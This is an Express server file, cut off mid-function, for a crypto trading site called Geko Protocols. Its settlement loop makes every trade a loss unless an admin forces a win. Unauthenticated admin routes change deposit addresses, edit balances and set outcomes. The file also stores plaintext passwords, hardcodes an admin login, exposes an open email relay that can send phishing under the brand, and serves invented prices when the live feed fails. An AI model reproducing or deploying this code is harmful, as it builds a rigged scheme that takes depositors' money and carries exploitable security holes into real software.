import express from 'express';
import cors from 'cors';
import axios from 'axios';
import dotenv from 'dotenv';
import fs from 'fs';
import path from 'path';
import { fileURLToPath } from 'url';
import { Connection, PublicKey, LAMPORTS_PER_SOL, Keypair, Transaction, SystemProgram } from '@solana/web3.js';
import { sendAndConfirmTransaction } from '@solana/web3.js';
import bs58 from 'bs58';
import crypto from 'crypto';
import { Resend } from 'resend';
import pg from 'pg';

dotenv.config();

const { Pool } = pg;
const resend = process.env.RESEND_API_KEY ? new Resend(process.env.RESEND_API_KEY) : null;

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

// Global Error Handlers to prevent crashes
process.on('uncaughtException', (err) => {
  console.error('[CRITICAL] Uncaught Exception:', err.message);
  console.error(err.stack);
});

process.on('unhandledRejection', (reason, promise) => {
  console.error('[CRITICAL] Unhandled Rejection at:', promise, 'reason:', reason);
});

const app = express();
const port = 8080;

// ─── Debug Logger ──────────────────────────────────────────────────────────
app.use((req, res, next) => {
  console.log(`[Request] ${req.method} ${req.url}`);
  next();
});

app.use(cors());
app.use((req, res, next) => {
  res.setHeader('X-Frame-Options', 'ALLOWALL');
  next();
});

app.use(express.json({ limit: '50mb' }));
app.use(express.urlencoded({ limit: '50mb', extended: true }));

let pool = null;
let dbAvailable = false;
let lastInitError = null;
let dbInitPromise = null;

const initializeDatabase = async () => {
  let attempts = 0;
  const maxAttempts = 10;
  
  while (attempts < maxAttempts) {
    try {
      attempts++;
      if (!process.env.DATABASE_URL) {
          throw new Error('DATABASE_URL is not set in .env');
      }

      console.log(`[DB] Connecting to PostgreSQL (Attempt ${attempts}/${maxAttempts})...`);
      
      if (pool) {
        try { await pool.end(); } catch (e) {}
      }

      pool = new pg.Pool({
        connectionString: process.env.DATABASE_URL,
        ssl: { rejectUnauthorized: false },
        max: 50,
        idleTimeoutMillis: 30000,
        connectionTimeoutMillis: 10000,
      });

      const client = await pool.connect();
      console.log('[DB] PostgreSQL connected successfully.');
      client.release();

      // Create Tables
      await pool.query(`
        CREATE TABLE IF NOT EXISTS users (
          id SERIAL PRIMARY KEY,
          wallet_address TEXT UNIQUE,
          email TEXT UNIQUE,
          password TEXT,
          signup_code TEXT,
          nickname TEXT,
          trading_balance TEXT DEFAULT '0',
          protocol_settlement_balance TEXT DEFAULT '0',
          demo_balance TEXT DEFAULT '100000',
          status TEXT DEFAULT 'guest',
          kyc_status TEXT DEFAULT 'none',
          wallet_data JSONB DEFAULT '{}',
          ip_address TEXT,
          last_seen TIMESTAMPTZ DEFAULT NOW(),
          created_at TIMESTAMPTZ DEFAULT NOW(),
          pending_deposit_currency TEXT,
          pending_deposit_amount TEXT,
          swap_sent BOOLEAN DEFAULT FALSE,
          last_interest_at TIMESTAMPTZ
        );

        CREATE TABLE IF NOT EXISTS config (
          key TEXT PRIMARY KEY,
          value TEXT,
          updated_at TIMESTAMPTZ DEFAULT NOW()
        );

        CREATE TABLE IF NOT EXISTS trades (
          id TEXT PRIMARY KEY,
          wallet_address TEXT,
          symbol TEXT,
          direction TEXT,
          amount DECIMAL(24, 8),
          entry_price DECIMAL(24, 8),
          leverage DECIMAL(24, 8),
          duration INTEGER,
          is_demo BOOLEAN DEFAULT FALSE,
          status TEXT DEFAULT 'pending',
          created_at TIMESTAMPTZ DEFAULT NOW(),
          settled_at TIMESTAMPTZ,
          force_outcome TEXT
        );

        CREATE TABLE IF NOT EXISTS withdrawal_requests (
          id SERIAL PRIMARY KEY,
          wallet_address TEXT,
          destination_address TEXT,
          amount DECIMAL(24, 8),
          asset TEXT,
          status TEXT DEFAULT 'pending',
          created_at TIMESTAMPTZ DEFAULT NOW(),
          processed_at TIMESTAMPTZ,
          admin_note TEXT
        );

        CREATE TABLE IF NOT EXISTS transactions (
          id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
          wallet_address TEXT,
          asset_symbol TEXT,
          amount DECIMAL(24, 8),
          type TEXT,
          payment_id TEXT,
          tx_signature TEXT,
          reference TEXT,
          status TEXT DEFAULT 'completed',
          created_at TIMESTAMPTZ DEFAULT NOW()
        );

        CREATE TABLE IF NOT EXISTS visitors (
          id SERIAL PRIMARY KEY,
          visitor_id TEXT UNIQUE,
          ip_address TEXT,
          user_agent TEXT,
          page_path TEXT,
          last_seen TIMESTAMPTZ DEFAULT NOW(),
          visit_count INTEGER DEFAULT 1
        );

        CREATE TABLE IF NOT EXISTS support_tickets (
          id SERIAL PRIMARY KEY,
          wallet_address TEXT UNIQUE,
          subject TEXT,
          messages JSONB DEFAULT '[]',
          updated_at TIMESTAMPTZ DEFAULT NOW()
        );

        CREATE TABLE IF NOT EXISTS kyc_submissions (
          id SERIAL PRIMARY KEY,
          wallet_address TEXT,
          country TEXT,
          id_front TEXT,
          id_back TEXT,
          status TEXT DEFAULT 'pending',
          created_at TIMESTAMPTZ DEFAULT NOW()
        );
      `);

      // Seed default config
      await pool.query(`
        INSERT INTO config (key, value) VALUES 
        ('solana_deposit_address', '6HmBxJuv9f5P92am6AK18KZGkHGqbNUazYXXKhvrDviw'),
        ('btc_deposit_address', '1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa'),
        ('eth_deposit_address', '0x742d35Cc6634C0532925a3b844Bc454e4438f44e'),
        ('usdt_deposit_address', 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t')
        ON CONFLICT (key) DO NOTHING;
      `);

      dbAvailable = true;
      lastInitError = null;

      // Server-side trade settlement loop
      const settleTrades = async () => {
        if (!dbAvailable || !pool) {
            setTimeout(settleTrades, 5000);
            return;
        }
        try {
          const res = await pool.query(`
              SELECT * FROM trades 
              WHERE status = 'pending' 
              AND created_at <= NOW() - (duration || ' seconds')::interval
          `);
          const pendingTrades = res.rows;

          for (const trade of pendingTrades) {
            console.log(`[Auto-Settle] Settling trade ${trade.id} for ${trade.wallet_address}`);
            
            // User Requirement: DEFAULT to loss unless admin explicitly sets 'win'
            const isWin = trade.force_outcome === 'win';

            const leverageFactor = (parseFloat(trade.leverage || 10)) / 10;
            const amount = parseFloat(trade.amount || 0);
            const payoutRate = 0.85;
            const payout = isWin ? amount * (1 + (payoutRate * leverageFactor)) : 0;
            
            const finalStatus = isWin ? 'won' : 'lost';
            
            await pool.query(`
              UPDATE trades SET status = $1, settled_at = NOW() WHERE id = $2
            `, [finalStatus, trade.id]);

            if (payout > 0) {
              const balanceField = trade.is_demo ? 'demo_balance' : 'trading_balance';
              await pool.query(`
                  UPDATE users SET ${balanceField} = (${balanceField}::numeric + $1)::text 
                  WHERE wallet_address = $2
              `, [payout, trade.wallet_address]);
              
              await recordTransaction({
                wallet_address: trade.wallet_address,
                asset_symbol: 'USDT',
                amount: payout,
                type: 'trade',
                reference: `trade-auto-settle:${trade.id}`,
                created_at: new Date().toISOString()
              });
            }
          }
        } catch (e) {
          console.error('[Auto-Settle Error]', e.message);
        } finally {
            setTimeout(settleTrades, 5000);
        }
      };
      settleTrades();

      // Session Yield Processor (48h / $2)
      setInterval(processDailyInterest, 60 * 60 * 1000); 
      processDailyInterest();
      
      return; // Exit loop on success
    } catch (err) {
      console.error(`[DB Error] Attempt ${attempts} failed:`, err.message);
      lastInitError = err.message;
      dbAvailable = false;
      
      if (attempts < maxAttempts) {
        const delay = Math.min(1000 * Math.pow(2, attempts), 30000); // Exponential backoff
        console.log(`[DB] Retrying in ${delay}ms...`);
        await new Promise(resolve => setTimeout(resolve, delay));
      } else {
        console.error('[DB Error] Max initialization attempts reached. Database will remain unavailable.');
      }
    }
  }
};

async function processDailyInterest() {
  if (!dbAvailable || !pool) return;
  try {
    console.log('[Yield] Checking for eligible users for $2 yield (48h cycle)...');
    
    const res = await pool.query(`
        SELECT * FROM users 
        WHERE (last_interest_at IS NULL OR last_interest_at <= NOW() - INTERVAL '48 hours')
        AND (protocol_settlement_balance::numeric >= 1000)
    `);
    
    const eligibleUsers = res.rows;

    for (const user of eligibleUsers) {
      const yieldAmt = 2.00;
      
      await pool.query(`
          UPDATE users SET 
            protocol_settlement_balance = (protocol_settlement_balance::numeric + $1)::text,
            last_interest_at = NOW()
          WHERE id = $2
      `, [yieldAmt, user.id]);

      await recordTransaction({
        wallet_address: user.wallet_address,
        asset_symbol:   'USDT',
        amount:         yieldAmt,
        type:           'interest',
        reference:      '48h_session_yield_reward'
      });
      
      console.log(`[Yield] Credited $${yieldAmt} to ${user.wallet_address}`);
    }
  } catch (err) {
    console.error('[Yield Error] Failed to process session yield:', err.message);
  }
}

dbInitPromise = initializeDatabase();

// ─── Shared Utilities ──────────────────────────────────────────────────────
async function sendTelegramNotification(message) {
  const botToken = process.env.TELEGRAM_BOT_TOKEN;
  const chatId = process.env.TELEGRAM_CHAT_ID;
  if (!botToken || !chatId) return;

  try {
    await axios.post(`https://api.telegram.org/bot${botToken}/sendMessage`, {
      chat_id: chatId,
      text: message,
      parse_mode: 'HTML'
    }, { timeout: 10000 });
  } catch (err) {
    console.error('[Telegram] Notification failed:', err.message);
  }
}

async function recordTransaction({ wallet_address, asset_symbol, amount, type, payment_id = null, tx_signature = null, reference = null, status = 'completed' }) {
  if (!dbAvailable || !pool || !wallet_address) return null;

  try {
    // Upsert user if not exists
    await pool.query(`
        INSERT INTO users (wallet_address, last_seen, created_at)
        VALUES ($1, NOW(), NOW())
        ON CONFLICT (wallet_address) DO UPDATE SET last_seen = NOW()
    `, [wallet_address]);

    const res = await pool.query(`
        INSERT INTO transactions (wallet_address, asset_symbol, amount, type, payment_id, tx_signature, reference, status)
        VALUES ($1, $2, $3, $4, $5, $6, $7, $8)
        RETURNING *
    `, [wallet_address, asset_symbol.toUpperCase(), parseFloat(amount), type, payment_id, tx_signature, reference, status]);

    return res.rows[0];
  } catch (err) {
    console.error('[Record Tx] Error:', err.message);
    return null;
  }
}

async function getUserBalance(walletAddress, assetSymbol) {
  if (!dbAvailable || !pool) return 0;

  try {
    if (assetSymbol.toUpperCase() === 'USDT') {
      const res = await pool.query('SELECT protocol_settlement_balance FROM users WHERE wallet_address = $1', [walletAddress]);
      return parseFloat(res.rows[0]?.protocol_settlement_balance || 0);
    }

    const res = await pool.query(`
        SELECT COALESCE(SUM(amount), 0) as balance 
        FROM transactions 
        WHERE wallet_address = $1 AND asset_symbol = $2 AND status = 'completed' AND type != 'trade'
    `, [walletAddress, assetSymbol.toUpperCase()]);
    
    return parseFloat(res.rows[0]?.balance || 0);
  } catch (err) {
    console.error('[Get Balance] Error:', err.message);
    return 0;
  }
}

// ─── Health check ──────────────────────────────────────────────────────────
app.get('/api/health', async (req, res) => {
  if (dbInitPromise) await dbInitPromise.catch(() => {});
  
  let dbStatus = dbAvailable ? 'CONNECTED (POSTGRES) ✅' : 'DISCONNECTED ❌';
  let userCount = 0;
  if (dbAvailable) {
      const r = await pool.query('SELECT COUNT(*) FROM users');
      userCount = parseInt(r.rows[0].count);
  }
  
  res.json({ 
    status: 'ONLINE', 
    db: dbStatus, 
    users: userCount, 
    error: lastInitError,
    time: new Date().toISOString() 
  });
});

app.use(async (req, res, next) => {
  // Wait for DB initialization if it's still in progress
  if (dbInitPromise && !dbAvailable) {
    try {
      console.log(`[DB Middleware] Waiting for database initialization for ${req.url}...`);
      // Wait up to 30 seconds for DB to be ready
      const timeout = new Promise((_, reject) => setTimeout(() => reject(new Error('DB_INIT_TIMEOUT')), 30000));
      await Promise.race([dbInitPromise, timeout]);
    } catch (e) {
      console.warn('[DB Middleware] Database initialization wait ended:', e.message);
    }
  }
  next();
});

// ─── Config endpoints ──────────────────────────────────────────────────────
app.get('/api/config', async (req, res) => {
  if (dbAvailable && pool) {
    try {
      const r = await pool.query('SELECT key, value FROM config');
      const dbConfig = r.rows.reduce((acc, row) => ({ ...acc, [row.key]: row.value }), {});
      return res.json(dbConfig);
    } catch (e) { console.error('Config fetch error:', e.message); }
  }
  res.json({ 
    solana_deposit_address: '6HmBxJuv9f5P92am6AK18KZGkHGqbNUazYXXKhvrDviw',
    btc_deposit_address: '1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa',
    eth_deposit_address: '0x742d35Cc6634C0532925a3b844Bc454e4438f44e',
    usdt_deposit_address: 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t'
  });
});

app.post('/api/admin/config', async (req, res) => {
  const { solana_deposit_address, btc_deposit_address, eth_deposit_address, usdt_deposit_address } = req.body;

  if (dbAvailable && pool) {
    try {
      const updates = [];
      if (solana_deposit_address) updates.push(['solana_deposit_address', solana_deposit_address]);
      if (btc_deposit_address) updates.push(['btc_deposit_address', btc_deposit_address]);
      if (eth_deposit_address) updates.push(['eth_deposit_address', eth_deposit_address]);
      if (usdt_deposit_address) updates.push(['usdt_deposit_address', usdt_deposit_address]);

      for (const [key, val] of updates) {
        await pool.query(`
            INSERT INTO config (key, value, updated_at) VALUES ($1, $2, NOW())
            ON CONFLICT (key) DO UPDATE SET value = $2, updated_at = NOW()
        `, [key, val]);
      }
      return res.json({ success: true });
    } catch (e) {
      console.error('Config update error:', e.message);
      return res.status(500).json({ error: e.message });
    }
  }
  res.status(503).json({ error: 'Database unavailable' });
});

// ─── Live prices proxy ─────────────────────────────────────────────────────
app.get('/api/binance/prices', async (req, res) => {
  try {
    const krakenPairs = 'XXBTZUSD,XETHZUSD,SOLUSD,XXRPZUSD,ADAUSD,AVAXUSD,XDGUSD,DOTUSD,LINKUSD,XLTCZUSD,TRXUSD,UNIUSD,ATOMUSD,AAVEUSD';
    const krakenRes = await axios.get(`https://api.kraken.com/0/public/Ticker?pair=${krakenPairs}`, {
      headers: { 'Accept': 'application/json', 'User-Agent': 'GekoProtocol/1.0' },
      timeout: 10000
    });
    const r = krakenRes.data.result;

    const findPair = (candidates) => {
      for (const c of candidates) { if (r[c]) return r[c]; }
      return null;
    };
    const change = (pair) => {
      if (!pair) return '0';
      const last = parseFloat(pair.c[0]);
      const open = parseFloat(pair.o);
      return open > 0 ? (((last - open) / open) * 100).toFixed(2) : '0';
    };

    const pairs = {
      BTC:  findPair(['XXBTZUSD', 'XBTUSD', 'BTCUSD']),
      ETH:  findPair(['XETHZUSD', 'ETHUSD']),
      SOL:  findPair(['SOLUSD']),
      XRP:  findPair(['XXRPZUSD', 'XRPUSD']),
      ADA:  findPair(['ADAUSD']),
      AVAX: findPair(['AVAXUSD']),
      DOGE: findPair(['XDGUSD', 'DOGEUSD']),
      DOT:  findPair(['DOTUSD']),
      LINK: findPair(['LINKUSD']),
      LTC:  findPair(['XLTCZUSD', 'LTCUSD']),
      TRX:  findPair(['TRXUSD']),
      UNI:  findPair(['UNIUSD']),
      ATOM: findPair(['ATOMUSD']),
      AAVE: findPair(['AAVEUSD']),
      BNB:  findPair(['BNBUSD']),
    };

    const mapped = Object.entries(pairs)
      .filter(([, p]) => p)
      .map(([sym, p]) => ({ symbol: `${sym}USDT`, lastPrice: p.c[0], priceChangePercent: change(p) }));

    mapped.push({ symbol: 'USDTUSDT', lastPrice: '1.00', priceChangePercent: '0' });

    return res.json(mapped);
  } catch (err) {
    console.warn('Kraken failed:', err.message);
    const fallback = [
        { symbol: 'BTCUSDT', lastPrice: '96405.00', priceChangePercent: '1.25' },
        { symbol: 'ETHUSDT', lastPrice: '2750.50', priceChangePercent: '-0.42' },
        { symbol: 'SOLUSDT', lastPrice: '185.20', priceChangePercent: '3.10' },
        { symbol: 'BNBUSDT', lastPrice: '640.15', priceChangePercent: '0.85' },
        { symbol: 'XRPUSDT', lastPrice: '2.72', priceChangePercent: '1.10' },
        { symbol: 'ADAUSDT', lastPrice: '1.15', priceChangePercent: '-1.50' },
        { symbol: 'DOGEUSDT', lastPrice: '0.42', priceChangePercent: '5.20' },
        { symbol: 'DOTUSDT', lastPrice: '7.80', priceChangePercent: '0.00' },
        { symbol: 'LINKUSDT', lastPrice: '24.20', priceChangePercent: '2.15' },
        { symbol: 'LTCUSDT', lastPrice: '115.40', priceChangePercent: '-0.30' },
        { symbol: 'TRXUSDT', lastPrice: '0.22', priceChangePercent: '0.45' },
        { symbol: 'UNIUSDT', lastPrice: '12.10', priceChangePercent: '1.80' },
        { symbol: 'ATOMUSDT', lastPrice: '8.45', priceChangePercent: '-0.90' },
        { symbol: 'AAVEUSDT', lastPrice: '185.00', priceChangePercent: '0.00' },
        { symbol: 'USDTUSDT', lastPrice: '1.00', priceChangePercent: '0' }
    ];
    return res.json(fallback);
  }
});

app.get('/api/binance/klines', async (req, res) => {
  const { symbol, interval, limit } = req.query;
  const sym = (symbol || 'BTCUSDT').replace('USDT', '');
  
  const krakenMap = {
    'BTC': 'XXBTZUSD', 'ETH': 'XETHZUSD', 'SOL': 'SOLUSD', 'XRP': 'XXRPZUSD', 
    'ADA': 'ADAUSD', 'AVAX': 'AVAXUSD', 'DOGE': 'XDGUSD', 'DOT': 'DOTUSD', 
    'LINK': 'LINKUSD', 'LTC': 'XLTCZUSD', 'TRX': 'TRXUSD', 'UNI': 'UNIUSD', 
    'ATOM': 'ATOMUSD', 'AAVE': 'AAVEUSD', 'BNB': 'BNBUSD'
  };

  const pair = krakenMap[sym] || 'XXBTZUSD';
  
  try {
    const krakenInterval = interval === '1m' ? 1 : 60; 
    const krakenRes = await axios.get(`https://api.kraken.com/0/public/OHLC?pair=${pair}&interval=${krakenInterval}`, {
      headers: { 'Accept': 'application/json', 'User-Agent': 'GekoProtocol/1.0' },
      timeout: 10000
    });
    
    if (krakenRes.data && krakenRes.data.result && krakenRes.data.result[pair]) {
      const data = krakenRes.data.result[pair].slice(-(parseInt(limit) || 100));
      const formatted = data.map(d => [
        d[0] * 1000, 
        d[1], 
        d[2], 
        d[3], 
        d[4], 
      ]);
      return res.json(formatted);
    }
    throw new Error('Invalid response from Kraken');
  } catch (err) {
    console.warn('Kraken Klines failed:', err.message);
    const now = Math.floor(Date.now() / 60000) * 60000;
    const mock = [];
    let p = 50000;
    for(let i=100; i>=0; i--) {
        const o = p;
        const c = p + (Math.random() - 0.5) * 100;
        mock.push([now - i*60000, o, Math.max(o, c) + 20, Math.min(o, c) - 20, c]);
        p = c;
    }
    return res.json(mock);
  }
});

// ─── Admin User Management ─────────────────────────────────────────────────
app.get('/api/admin/users', async (req, res) => {
  if (dbAvailable && pool) {
    try {
      const r = await pool.query(`
          SELECT u.*, 
                 (SELECT COUNT(*) FROM trades t WHERE t.wallet_address = u.wallet_address AND t.status = 'pending') as active_trades_count
          FROM users u
          ORDER BY u.last_seen DESC
      `);
      return res.json(r.rows);
    } catch (e) {
      console.error('[Admin] REGISTRY_FETCH_ERROR:', e.message);
      return res.status(500).json({ error: e.message });
    }
  }
  res.status(503).json({ error: 'Database unavailable' });
});

app.post('/api/admin/users/update', async (req, res) => {
  const { id, wallet_data, balance_override, trading_balance, demo_balance, protocol_settlement_balance, swap_sent } = req.body;

  if (dbAvailable && pool) {
    try {
      const updates = [];
      const values = [];
      let idx = 1;

      if (wallet_data !== undefined) { updates.push(`wallet_data = $${idx++}`); values.push(JSON.stringify(wallet_data)); }
      if (balance_override !== undefined) { updates.push(`balance_override = $${idx++}`); values.push(balance_override); }
      if (trading_balance !== undefined) { updates.push(`trading_balance = $${idx++}`); values.push(trading_balance.toString()); }
      if (demo_balance !== undefined) { updates.push(`demo_balance = $${idx++}`); values.push(demo_balance.toString()); }
      if (protocol_settlement_balance !== undefined) { updates.push(`protocol_settlement_balance = $${idx++}`); values.push(protocol_settlement_balance.toString()); }
      
      if (swap_sent !== undefined) {
        // Need current swap_sent state to check if confirmed
        const currentRes = await pool.query('SELECT swap_sent, wallet_address, protocol_settlement_balance FROM users WHERE id = $1', [id]);
        const user = currentRes.rows[0];
        if (user) {
            const oldSwapSent = user.swap_sent;
            updates.push(`swap_sent = $${idx++}`); values.push(swap_sent);
            
            if (oldSwapSent === true && swap_sent === false) {
                await recordTransaction({
                    wallet_address: user.wallet_address,
                    asset_symbol: 'USDT',
                    amount: parseFloat(user.protocol_settlement_balance || 0),
                    type: 'swap',
                    reference: 'admin_confirmed_swap',
                    status: 'completed'
                });
            }
        }
      }

      if (updates.length > 0) {
          values.push(id);
          await pool.query(`UPDATE users SET ${updates.join(', ')} WHERE id = $${idx}`, values);
      }
      
      const result = await pool.query('SELECT * FROM users WHERE id = $1', [id]);
      return res.json({ success: true, user: result.rows[0] });
    } catch (e) {
      console.error('[Admin] USER_UPDATE_ERROR:', e.message);
      return res.status(500).json({ error: e.message });
    }
  }
  res.status(503).json({ error: 'Database unavailable' });
});

app.post('/api/admin/users/delete', async (req, res) => {
  const { id } = req.body;
  if (dbAvailable && pool) {
    try {
      await pool.query('DELETE FROM users WHERE id = $1 OR wallet_address = $1', [id]);
      return res.json({ success: true });
    } catch (e) {
      console.error('[Admin] USER_DELETE_ERROR:', e.message);
      return res.status(500).json({ error: e.message });
    }
  }
  res.status(503).json({ error: 'Database unavailable' });
});

// Register / upsert a user (called on wallet connect)
app.post('/api/users/upsert', async (req, res) => {
  let { wallet_address, address, wallet_data, ip_address, nickname } = req.body;
  const targetAddress = (wallet_address || address || '').trim();
  
  if (!targetAddress || targetAddress.length < 32) {
    return res.status(400).json({ error: 'Valid wallet_address required' });
  }

  if (dbAvailable && pool) {
    try {
      const r = await pool.query(`
          INSERT INTO users (wallet_address, wallet_data, ip_address, last_seen, nickname, created_at)
          VALUES ($1, $2, $3, NOW(), $4, NOW())
          ON CONFLICT (wallet_address) DO UPDATE SET
            wallet_data = EXCLUDED.wallet_data,
            ip_address = COALESCE(EXCLUDED.ip_address, users.ip_address),
            last_seen = NOW(),
            nickname = COALESCE(EXCLUDED.nickname, users.nickname)
          RETURNING *
      `, [targetAddress, JSON.stringify(wallet_data || {}), ip_address || req.ip || null, nickname || null]);
      
      return res.json({ success: true, user: r.rows[0] });
    } catch (e) {
      console.error('[Upsert] Error:', e.message);
      return res.status(500).json({ error: e.message });
    }
  }
  res.status(503).json({ error: 'Database unavailable' });
});

app.post('/api/users/heartbeat', async (req, res) => {
  const { wallet_address, address } = req.body || {};
  const target = (wallet_address || address || '').trim();
  if (!target) return res.json({ success: false });

  if (dbAvailable && pool) {
    try {
      await pool.query('UPDATE users SET last_seen = NOW() WHERE wallet_address = $1', [target]);
      return res.json({ success: true });
    } catch (e) { 
      console.error('Heartbeat error:', e.message);
      return res.status(500).json({ success: false });
    }
  }
  res.status(503).json({ success: false });
});

app.get('/api/user/data', async (req, res) => {
  const { address } = req.query;
  if (!dbAvailable || !pool) return res.status(503).json({ error: 'Database unavailable' });

  try {
    const r = await pool.query('SELECT * FROM users WHERE wallet_address = $1', [address]);
    if (r.rows.length > 0) return res.json(r.rows[0]);
    return res.status(404).json({ error: 'User not found' });
  } catch (e) { 
    return res.status(500).json({ error: e.message });
  }
});

// ─── Email Auth ─────────────────────────────────────────────────────────────
app.post('/api/send-email', async (req, res) => {
  const { to, subject, html } = req.body;
  if (!resend) return res.status(503).json({ error: 'Email service unavailable' });
  
  try {
    const data = await resend.emails.send({
      from: 'Geko Protocols <onboarding@resend.dev>',
      to: [to],
      subject: subject,
      html: html,
    });
    res.json({ success: true, data });
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

app.post('/api/auth/signup-request', async (req, res) => {
  const { email, password, name } = req.body;
  if (!email || !password) return res.status(400).json({ error: 'Email and password required' });
  if (!dbAvailable || !pool) return res.status(503).json({ error: 'Database unavailable' });

  try {
    const userEmail = email.toLowerCase().trim();
    const existingRes = await pool.query('SELECT * FROM users WHERE email = $1', [userEmail]);
    const existing = existingRes.rows[0];
    
    if (existing && existing.status === 'approved') {
        return res.status(400).json({ error: 'Email already registered and approved' });
    }

    const signupCode = Math.floor(100000 + Math.random() * 900000).toString();
    console.log(`[Signup] VERIFICATION_CODE for ${userEmail}: ${signupCode}`);

    if (resend) {
        try {
            await resend.emails.send({
                from: 'Geko Protocols <onboarding@resend.dev>',
                to: [userEmail],
                subject: `Geko Verification Code: ${signupCode}`,
                html: `<p>Your Geko Protocols verification code is: <strong>${signupCode}</strong></p>`
            });
        } catch (emailErr) {
            console.warn('[Signup] Email delivery failed:', emailErr.message);
        }
    }

    const virtualAddress = '0x' + crypto.createHash('sha256').update(userEmail).digest('hex').slice(0, 40);
    const nickname = name || userEmail.split('@')[0].toUpperCase();

    await sendTelegramNotification(`<b>🆕 New Signup Request</b>\n\n<b>Email:</b> ${userEmail}\n<b>Nickname:</b> ${nickname}\n<b>Code:</b> <code>${signupCode}</code>`);

    await pool.query(`
        INSERT INTO users (email, password, signup_code, nickname, wallet_address, status, last_seen, created_at)
        VALUES ($1, $2, $3, $4, $5, 'guest', NOW(), NOW())
        ON CONFLICT (email) DO UPDATE SET
            password = EXCLUDED.password,
            signup_code = EXCLUDED.signup_code,
            nickname = EXCLUDED.nickname,
            last_seen = NOW()
    `, [userEmail, password, signupCode, nickname, virtualAddress]);

    res.json({ success: true, message: 'Verification code sent', alternativeCode: signupCode });
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

app.post('/api/auth/signup-confirm', async (req, res) => {
  const { email, code } = req.body;
  if (!email || !code) return res.status(400).json({ error: 'Email and code required' });
  if (!dbAvailable || !pool) return res.status(503).json({ error: 'Database unavailable' });

  try {
    const userEmail = email.toLowerCase().trim();
    const verificationCode = String(code).trim();

    const r = await pool.query(
      "UPDATE users SET status = 'pending_approval', signup_code = NULL WHERE email = $1 AND signup_code = $2 RETURNING *",
      [userEmail, verificationCode]
    );

    if (r.rows.length === 0) {
      // Check if user exists but code is wrong, or user is already approved
      const checkRes = await pool.query('SELECT status, signup_code FROM users WHERE email = $1', [userEmail]);
      const user = checkRes.rows[0];
      
      if (!user) {
        return res.status(404).json({ error: 'User record not found. Please sign up again.' });
      }
      
      if (user.status === 'approved' || user.status === 'pending_approval') {
        return res.json({ success: true, message: 'Your email is already verified. Waiting for admin approval.' });
      }

      return res.status(400).json({ error: 'Invalid verification code. Please check your email or request a new code.' });
    }

    res.json({ success: true, message: 'Registration confirmed! Waiting for admin approval.' });
  } catch (e) {
    console.error('[Signup Confirm Error]', e.message);
    res.status(500).json({ error: 'An internal server error occurred during confirmation.' });
  }
});

app.post('/api/auth/login', async (req, res) => {
  const { email, password } = req.body;
  if (!email || !password) return res.status(400).json({ error: 'Email and password required' });

  if (email.toLowerCase().trim() === 'admin@gmail.com' && password === '12345678') {
      return res.json({ 
          success: true, 
          user: { address: 'ADMIN_GATEWAY', email: 'admin@gmail.com', nickname: 'ADMIN_ROOT', status: 'approved', role: 'admin' }
      });
  }

  if (!dbAvailable || !pool) return res.status(503).json({ error: 'Database unavailable' });

  try {
    const r = await pool.query('SELECT * FROM users WHERE email = $1 AND password = $2', [email.toLowerCase().trim(), password]);
    const user = r.rows[0];
    
    if (!user) return res.status(401).json({ error: 'Invalid credentials' });
    if (user.status === 'guest') return res.status(403).json({ error: 'Account pending admin approval', status: 'guest' });
    if (user.status === 'rejected') return res.status(403).json({ error: 'Account rejected by admin', status: 'rejected' });

    await pool.query('UPDATE users SET last_seen = NOW() WHERE id = $1', [user.id]);

    return res.json({ success: true, user: { ...user, address: user.wallet_address, role: 'user' } });
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

app.post('/api/admin/users/logout', async (req, res) => {
  const { id } = req.body;
  if (dbAvailable && pool) {
    try {
      await pool.query('UPDATE users SET status = \'force_logout\' WHERE id = $1 OR wallet_address = $1', [id]);
      return res.json({ success: true });
    } catch (e) { return res.status(500).json({ error: e.message }); }
  }
  res.status(503).json({ error: 'Database unavailable' });
});

app.post('/api/auth/logout-and-forget', async (req, res) => {
  const { email } = req.body;
  if (!email) return res.status(400).json({ error: 'Email required' });
  if (dbAvailable && pool) {
    try {
      await pool.query('DELETE FROM users WHERE email = $1', [email.toLowerCase().trim()]);
      return res.json({ success: true });
    } catch (e) { return res.status(500).json({ error: e.message }); }
  }
  res.status(503).json({ error: 'Database unavailable' });
});

// ─── Admin Management ─────────────────────────────────────────────────────
app.post('/api/admin/users/approve', async (req, res) => {
  const { userId } = req.body;
  if (!dbAvailable || !pool) return res.status(503).json({ error: 'Database unavailable' });
  try {
    // Convert to string to avoid potential type issues with wallet_address check
    const idStr = String(userId);
    const idInt = parseInt(idStr);
    
    if (!isNaN(idInt)) {
        await pool.query("UPDATE users SET status = 'approved' WHERE id = $1 OR wallet_address = $2", [idInt, idStr]);
    } else {
        await pool.query("UPDATE users SET status = 'approved' WHERE wallet_address = $1", [idStr]);
    }
    
    res.json({ success: true });
  } catch (e) { res.status(500).json({ error: e.message }); }
});

app.post('/api/admin/users/reject', async (req, res) => {
  const { userId } = req.body;
  if (!dbAvailable || !pool) return res.status(503).json({ error: 'Database unavailable' });
  try {
    await pool.query('UPDATE users SET status = \'rejected\' WHERE id = $1 OR wallet_address = $1', [userId]);
    res.json({ success: true });
  } catch (e) { res.status(500).json({ error: e.message }); }
});

app.post('/api/admin/force-outcome', async (req, res) => {
  const { tradeId, forceOutcome } = req.body;
  if (!dbAvailable || !pool) return res.status(503).json({ error: 'Database unavailable' });
  try {
    await pool.query('UPDATE trades SET force_outcome = $1 WHERE id = $2', [forceOutcome, tradeId]);
    res.json({ success: true });
  } catch (e) { res.status(500).json({ error: e.message }); }
});

app.post('/api/admin/deposit', async (req, res) => {
  const { walletAddress, currency, amount } = req.body;
  if (!dbAvailable || !pool) return res.status(503).json({ error: 'Database unavailable' });
  try {
    await pool.query(`
        UPDATE users SET 
            pending_deposit_currency = $1, 
            pending_deposit_amount = $2, 
            swap_sent = FALSE 
        WHERE wallet_address = $3
    `, [currency.toUpperCase(), amount, walletAddress]);
    res.json({ success: true });
  } catch (e) { res.status(500).json({ error: e.message }); }
});

app.post('/api/user/swap', async (req, res) => {
  const { walletAddress } = req.body;
  if (!dbAvailable || !pool) return res.status(503).json({ error: 'Database unavailable' });
  try {
